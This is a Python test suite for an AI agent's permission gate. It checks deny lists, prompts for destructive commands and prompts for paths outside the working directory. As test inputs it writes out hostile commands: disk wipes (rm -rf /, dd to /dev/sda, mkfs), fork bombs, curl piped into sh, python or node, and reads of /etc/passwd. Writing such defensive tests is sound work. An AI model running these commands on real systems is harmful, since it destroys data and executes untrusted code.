"""权限门行为测试：地板 / 默认层（destructive、路径越界）/ 规则与扩展表态的合并裁决。"""
import re
import subprocess
import sys
from pathlib import Path

import pytest

from core import interaction
from core.extension.builtin import permission
from core.extension.builtin.permission import Rules, build_gate
from core.extension.context import BeforeToolContext, Decision


def run_gate(tool_name: str, args: dict, cwd: Path | None = None) -> BeforeToolContext:
    ctx = BeforeToolContext(tool_name=tool_name, args=args, cwd=cwd)
    build_gate(Rules())(ctx)
    return ctx


def _vote(action: str, reason: str = "", source: str = "nano_extension_x") -> Decision:
    return Decision(action=action, reason=reason, source=source)


def _no_prompt(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: pytest.fail("must not ask"))


def _link_dir(link: Path, target: Path) -> None:
    """建目录链接：优先 symlink，Windows 无权限时退回 junction（Path.resolve 对两者都生效）。"""
    try:
        link.symlink_to(target, target_is_directory=True)
        return
    except OSError:
        pass
    if sys.platform == "win32":
        result = subprocess.run(["cmd", "/c", "mklink", "/J", str(link), str(target)], capture_output=True)
        if result.returncode == 0:
            return
    pytest.skip("directory links not available")


# --- 地板：命中即拒绝，不询问 ---

def test_deny_list_blocks():
    ctx = run_gate("terminal", {"command": "sudo apt install x"})
    assert ctx.blocked and ctx.block_reason == "Permission denied: 'sudo' is on the deny list."


def test_safe_command_does_not_prompt(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": "echo hi"}).blocked


def test_deny_is_case_insensitive():
    ctx = run_gate("terminal", {"command": "SUDO ls"})
    assert ctx.block_reason == "Permission denied: 'sudo' is on the deny list."


def test_fork_bomb_denied():
    assert "deny list" in run_gate("terminal", {"command": ":(){ :|:& };:"}).block_reason


def test_word_boundary_no_false_positive(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": "echo sudoku"}).blocked


def test_rm_absolute_path_is_not_floor_denied(monkeypatch):
    cards = []
    monkeypatch.setattr(permission, "ask_permission", lambda q: cards.append(q) or "y")
    assert not run_gate("terminal", {"command": "rm -rf /tmp/foo"}).blocked
    assert "Destructive command detected" in cards[0]


def test_sudo_as_argument_not_denied(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": "echo sudo"}).blocked


def test_man_reboot_not_denied(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": "man reboot"}).blocked


def test_man_mkfs_not_denied(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": "man mkfs"}).blocked


def test_echo_format_drive_not_denied(monkeypatch):
    cards = []
    monkeypatch.setattr(permission, "ask_permission", lambda q: cards.append(q) or "y")
    assert not run_gate("terminal", {"command": "echo format c:"}).blocked
    assert all("deny list" not in card for card in cards)


def test_redirect_to_dev_null_not_floor_denied(monkeypatch):
    cards = []
    monkeypatch.setattr(permission, "ask_permission", lambda q: cards.append(q) or "y")
    assert not run_gate("terminal", {"command": "echo hi > /dev/null"}).blocked
    assert all("deny list" not in card for card in cards)


def test_quoted_function_definition_not_denied(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": 'echo "a(){ a|a& }"'}).blocked


def test_of_dev_path_in_argument_not_floor_denied(monkeypatch):
    cards = []
    monkeypatch.setattr(permission, "ask_permission", lambda q: cards.append(q) or "y")
    assert not run_gate("terminal", {"command": "grep of=/dev/sda log.txt"}).blocked
    assert all("deny list" not in card for card in cards)


@pytest.mark.parametrize("command, label", [
    ("rm -rf /", "rm -rf /"),
    ("rm -fr /", "rm -fr /"),
    ("rm -rf /*", "rm -rf /"),
    ("rm  -rf  /", "rm -rf /"),
    ("rm\t-rf /", "rm -rf /"),
    ("rm -rf --no-preserve-root /", "--no-preserve-root"),
    ("echo x > /dev/sda", "> /dev/sd"),
    ("echo x >/dev/hda", "> /dev/hd"),
    ("echo x > /dev/nvme0n1", "> /dev/nvme"),
    ("echo x > /dev/vda", "> /dev/vd"),
    ("echo x > /dev/mmcblk0", "> /dev/mmcblk"),
    ("echo x > /dev/mapper/vg0", "> /dev/mapper"),
    ("echo x > /dev/md0", "> /dev/md"),
    ("echo x > /dev/loop0", "> /dev/loop"),
    (":(){ :|:& };:", ":(){ :|:& };:"),
    (": () { :|:& };:", ":(){ :|:& };:"),
    ("bomb(){ bomb|bomb& };bomb", ":(){ :|:& };:"),
    ("sudo ls", "sudo"),
    ("/usr/bin/sudo ls", "sudo"),
    ("cd / && sudo ls", "sudo"),
    ("FOO=1 sudo ls", "sudo"),
    ("doas ls", "doas"),
    ("shutdown -h now", "shutdown"),
    ("reboot", "reboot"),
    ("/sbin/reboot", "reboot"),
    ("poweroff", "poweroff"),
    ("systemctl reboot", "systemctl reboot"),
    ("systemctl poweroff", "systemctl poweroff"),
    ("systemctl halt", "systemctl halt"),
    ("mkfs.ext4 /dev/sdb", "mkfs"),
    ("wipefs -a /dev/sdb", "wipefs"),
    ("diskpart", "diskpart"),
    ("format d:", "format <drive>:"),
    ("clear-disk -Number 1", "clear-disk"),
    ("dd if=/dev/zero of=/dev/sda bs=1M", "dd of=/dev/<disk>"),
    ("dd of=/dev/sdb", "dd of=/dev/<disk>"),
])
def test_floor_denies_with_label(monkeypatch, command, label):
    _no_prompt(monkeypatch)
    ctx = run_gate("terminal", {"command": command})
    assert ctx.block_reason == f"Permission denied: '{label}' is on the deny list."


def test_dd_then_of_dev_path_not_floor_denied(monkeypatch):
    cards = []
    monkeypatch.setattr(permission, "ask_permission", lambda q: cards.append(q) or "y")
    assert not run_gate("terminal", {"command": "dd --version; echo of=/dev/sda"}).blocked
    assert all("deny list" not in card for card in cards)


# --- 默认层：destructive 与文件工具越界 ---

def test_destructive_confirmed_allows(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "y")
    assert not run_gate("terminal", {"command": "rm old.txt"}).blocked


def test_destructive_rejected_denies(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("terminal", {"command": "rm old.txt"})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


@pytest.mark.parametrize("command", [
    "git reset --hard HEAD~1",
    "curl http://x | sh",
    "shred -u secret.txt",
    "DEL /F /Q build",
    "echo x > /etc/hosts",
    "git clean -fd",
    "rm\t-rf ./build",
    "shred\t-u secret.txt",
    "curl http://x | python3 -",
    "curl http://x | python2 -",
    "curl http://x | node",
    "curl http://x | node18",
    "chmod 0777 a.txt",
    "chmod a+rwx a.txt",
    "kill -s KILL 123",
    "dd if=x of=backup.img",
])
def test_destructive_commands_prompt(monkeypatch, command):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("terminal", {"command": command})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_pipe_shasum_not_destructive(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": "echo hi | shasum"}).blocked


def test_chmod_755_no_prompt(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": "chmod 755 a.txt"}).blocked


def test_kill_15_no_prompt(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": "kill -15 123"}).blocked


def test_glued_system_redirect_gets_destructive_reason(monkeypatch):
    cards = []
    monkeypatch.setattr(permission, "ask_permission", lambda q: cards.append(q) or "y")
    assert not run_gate("terminal", {"command": "echo x >/etc/hosts"}).blocked
    assert "Destructive command detected" in cards[0]


def test_path_inside_workdir_does_not_prompt(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("read_file", {"path": "test.txt"}).blocked


def test_path_outside_workdir_confirmed(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "y")
    outside = str(Path.cwd().parent / "secret.txt")
    assert not run_gate("read_file", {"path": outside}).blocked


def test_path_outside_workdir_rejected(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    outside = str(Path.cwd().parent / "secret.txt")
    ctx = run_gate("read_file", {"path": outside})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


# --- terminal 工作目录外路径 ---

def test_terminal_relative_escape_confirmed(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "y")
    assert not run_gate("terminal", {"command": "cat ../secret.txt"}).blocked


def test_terminal_relative_escape_rejected(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("terminal", {"command": "cat ../secret.txt"})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_terminal_absolute_path_rejected(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("terminal", {"command": "cat /etc/passwd"})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_terminal_quoted_absolute_path_rejected(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("terminal", {"command": 'cat "/etc/passwd"'})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


@pytest.mark.skipif(sys.platform != "win32", reason="Windows drive-letter paths")
def test_terminal_windows_drive_path_rejected(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    command = f"type {Path.cwd().drive}\\Windows\\win.ini"
    ctx = run_gate("terminal", {"command": command})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_terminal_equals_value_rejected(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("terminal", {"command": "tool --file=/etc/x"})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_terminal_home_path_rejected(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("terminal", {"command": "cat ~/.gitconfig"})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_terminal_cd_parent_rejected(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("terminal", {"command": "cd .. && ls"})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_terminal_bare_cd_rejected(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("terminal", {"command": "cd && ls"})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_terminal_semicolon_escape_rejected(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("terminal", {"command": "cat ../x; echo done"})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_terminal_glued_redirect_rejected(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("terminal", {"command": "echo x >/tmp/out.txt"})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_terminal_quoted_text_does_not_prompt(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": 'git commit -m "fix /etc/hosts parsing"'}).blocked


def test_terminal_url_value_does_not_prompt(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": "curl --url=https://example.com/a/b"}).blocked


def test_terminal_relative_inside_does_not_prompt(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": "cat ./notes.txt"}).blocked


def test_terminal_workdir_absolute_does_not_prompt(monkeypatch):
    _no_prompt(monkeypatch)
    inside = str(Path.cwd() / "notes.txt")
    assert not run_gate("terminal", {"command": f"cat {inside}"}).blocked


def _msys_workdir() -> str:
    """当前工作目录的 Git Bash 盘符写法：E:/AI-Programs/... → /e/AI-Programs/..."""
    posix = Path.cwd().as_posix()
    return f"/{posix[0].lower()}{posix[2:]}"


@pytest.mark.skipif(sys.platform != "win32", reason="Git Bash 盘符路径仅 Windows")
def test_terminal_msys_drive_workdir_does_not_prompt(monkeypatch):
    if not Path.cwd().drive:
        pytest.skip("cwd 无盘符（UNC 路径）")

    _no_prompt(monkeypatch)
    command = f"cd {_msys_workdir()} && cat notes.txt"
    assert not run_gate("terminal", {"command": command}).blocked


@pytest.mark.skipif(sys.platform != "win32", reason="Git Bash 盘符路径仅 Windows")
def test_terminal_msys_other_drive_rejected(monkeypatch):
    drive = Path.cwd().drive
    if not drive:
        pytest.skip("cwd 无盘符（UNC 路径）")

    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    other = "z" if drive[0].lower() != "z" else "y"
    ctx = run_gate("terminal", {"command": f"cat /{other}/secret.txt"})
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_destructive_and_outside_prompts_once(monkeypatch):
    calls = []

    def answer(question):
        calls.append(question)
        return "y"

    monkeypatch.setattr(permission, "ask_permission", answer)
    assert not run_gate("terminal", {"command": "rm ../old.txt"}).blocked
    assert len(calls) == 1


# --- 调用方工作目录（子代理 working_directory）：越界判定按 tctx.cwd，而非仅 WORKDIR ---

def test_custom_cwd_absolute_path_inside_does_not_prompt(monkeypatch, tmp_path):
    _no_prompt(monkeypatch)
    assert not run_gate("read_file", {"path": str(tmp_path / "a.txt")}, cwd=tmp_path).blocked


def test_custom_cwd_absolute_path_outside_confirmed(monkeypatch, tmp_path):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("read_file", {"path": str(Path.cwd() / "a.txt")}, cwd=tmp_path)
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_custom_cwd_terminal_absolute_path_does_not_prompt(monkeypatch, tmp_path):
    _no_prompt(monkeypatch)
    assert not run_gate("terminal", {"command": f"cat {tmp_path / 'a.txt'}"}, cwd=tmp_path).blocked


def test_custom_cwd_terminal_workdir_path_outside_confirmed(monkeypatch, tmp_path):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    ctx = run_gate("terminal", {"command": f"cat {Path.cwd() / 'a.txt'}"}, cwd=tmp_path)
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_default_cwd_falls_back_to_workdir(monkeypatch):
    _no_prompt(monkeypatch)
    assert not run_gate("read_file", {"path": str(permission.WORKDIR / "a.txt")}).blocked


def test_custom_cwd_directory_link_does_not_prompt(monkeypatch, tmp_path):
    """cwd 是目录链接（未规范化）时，越界判定与工具一致（工具会 resolve），不误报。"""
    real = tmp_path / "real"
    real.mkdir()
    _link_dir(tmp_path / "link", real)
    _no_prompt(monkeypatch)
    assert not run_gate("read_file", {"path": "a.txt"}, cwd=tmp_path / "link").blocked


# --- 规则与扩展表态的合并裁决 ---

def test_rule_allow_overrides_destructive_default(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: pytest.fail("must not ask"))
    gate = build_gate(Rules(terminal=[(re.compile("^rm "), "allow")]))
    ctx = BeforeToolContext(tool_name="terminal", args={"command": "rm old.txt"})
    gate(ctx)
    assert not ctx.blocked


def test_rule_deny_blocks_with_rule_message():
    gate = build_gate(Rules(terminal=[(re.compile("^git push"), "deny")]))
    ctx = BeforeToolContext(tool_name="terminal", args={"command": "git push origin main"})
    gate(ctx)
    assert ctx.block_reason == "Permission denied by rule: ^git push"


def test_external_directory_rule_allow_skips_prompt():
    gate = build_gate(Rules(external_directory={"write_file": "allow"}))
    ctx = BeforeToolContext(tool_name="write_file", args={"path": str(Path.cwd().parent / "x.txt")})
    gate(ctx)
    assert not ctx.blocked


def test_external_directory_rule_uses_custom_cwd(monkeypatch, tmp_path):
    _no_prompt(monkeypatch)
    gate = build_gate(Rules(external_directory={"read_file": "deny"}))
    ctx = BeforeToolContext(tool_name="read_file", args={"path": str(tmp_path / "a.txt")}, cwd=tmp_path)
    gate(ctx)
    assert not ctx.blocked  # 位于调用方工作目录之内：规则不适用


def test_external_directory_rule_applies_outside_custom_cwd(tmp_path):
    gate = build_gate(Rules(external_directory={"read_file": "deny"}))
    ctx = BeforeToolContext(tool_name="read_file", args={"path": str(Path.cwd() / "a.txt")}, cwd=tmp_path)
    gate(ctx)
    assert ctx.blocked and ctx.block_reason == "Permission denied by rule: read_file.external_directory"


def test_extension_vote_allow_overrides_default_ask():
    gate = build_gate(Rules())
    ctx = BeforeToolContext(tool_name="terminal", args={"command": "rm old.txt"})
    ctx.decisions.append(_vote("allow", "trusted"))
    gate(ctx)
    assert not ctx.blocked


def test_conflict_rule_vs_extension_asks_and_yes_allows(monkeypatch):
    cards = []
    monkeypatch.setattr(permission, "ask_permission", lambda q: cards.append(q) or "y")
    gate = build_gate(Rules(terminal=[(re.compile("^git"), "allow")]))
    ctx = BeforeToolContext(tool_name="terminal", args={"command": "git push --force"})
    ctx.decisions.append(_vote("deny", "no force push", source="nano_extension_guard"))
    gate(ctx)
    assert not ctx.blocked
    assert "Decision conflict" in cards[0]
    assert "nano_extension_guard: deny (no force push)" in cards[0]


def test_conflict_rejected_denies(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: "n")
    gate = build_gate(Rules(terminal=[(re.compile("^git"), "allow")]))
    ctx = BeforeToolContext(tool_name="terminal", args={"command": "git push --force"})
    ctx.decisions.append(_vote("deny", "no force push", source="nano_extension_guard"))
    gate(ctx)
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"


def test_floor_beats_rule_and_extension(monkeypatch):
    monkeypatch.setattr(permission, "ask_permission", lambda q: pytest.fail("floor must not ask"))
    gate = build_gate(Rules(terminal=[(re.compile("^sudo"), "allow")]))
    ctx = BeforeToolContext(tool_name="terminal", args={"command": "sudo ls"})
    ctx.decisions.append(_vote("allow", "trusted"))
    gate(ctx)
    assert ctx.block_reason == "Permission denied: 'sudo' is on the deny list."


def test_same_action_uses_first_vote_message():
    gate = build_gate(Rules())
    ctx = BeforeToolContext(tool_name="terminal", args={"command": "ls"})
    ctx.decisions.append(_vote("deny", "first", source="ext_a"))
    ctx.decisions.append(_vote("deny", "second", source="ext_b"))
    gate(ctx)
    assert ctx.block_reason == "[Extension blocked] first"


def test_headless_conflict_defaults_to_deny(monkeypatch):
    # 其他测试模块导入 TUI 时会注册真实交互端口；这里还原未接 UI 的真实默认（ask_permission 返回 "no"）
    monkeypatch.setattr(interaction, "_ask_permission", None)
    gate = build_gate(Rules())          # 不 patch ask_permission：headless 默认 "no"
    ctx = BeforeToolContext(tool_name="terminal", args={"command": "ls"})
    ctx.decisions.append(_vote("allow", source="ext_a"))
    ctx.decisions.append(_vote("deny", reason="no", source="ext_b"))
    gate(ctx)
    assert ctx.block_reason == "Permission denied by user"


def test_rule_ask_confirmed_allows_with_card(monkeypatch):
    cards = []
    monkeypatch.setattr(permission, "ask_permission", lambda q: cards.append(q) or "y")
    gate = build_gate(Rules(terminal=[(re.compile("^git"), "ask")]))
    ctx = BeforeToolContext(tool_name="terminal", args={"command": "git status"})
    gate(ctx)
    assert not ctx.blocked
    assert cards == ["^git\n\ngit status"]


def test_rule_ask_rejected_denies_with_card(monkeypatch):
    cards = []
    monkeypatch.setattr(permission, "ask_permission", lambda q: cards.append(q) or "n")
    outside = str(Path.cwd().parent / "secret.txt")
    gate = build_gate(Rules(external_directory={"read_file": "ask"}))
    ctx = BeforeToolContext(tool_name="read_file", args={"path": outside})
    gate(ctx)
    assert ctx.blocked and ctx.block_reason == "Permission denied by user"
    assert "read_file.external_directory" in cards[0] and outside in cards[0]


def test_extension_source_named_rule_uses_extension_message():
    gate = build_gate(Rules())
    ctx = BeforeToolContext(tool_name="terminal", args={"command": "ls"})
    ctx.decisions.append(_vote("deny", "fake rule", source="rule"))
    gate(ctx)
    assert ctx.block_reason == "[Extension blocked] fake rule"


def test_non_json_serializable_args_use_str_fallback():
    gate = build_gate(Rules())
    ctx = BeforeToolContext(tool_name="grep", args={"pattern": object()})
    ctx.decisions.append(_vote("deny", "no"))
    gate(ctx)
    assert ctx.block_reason == "[Extension blocked] no"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
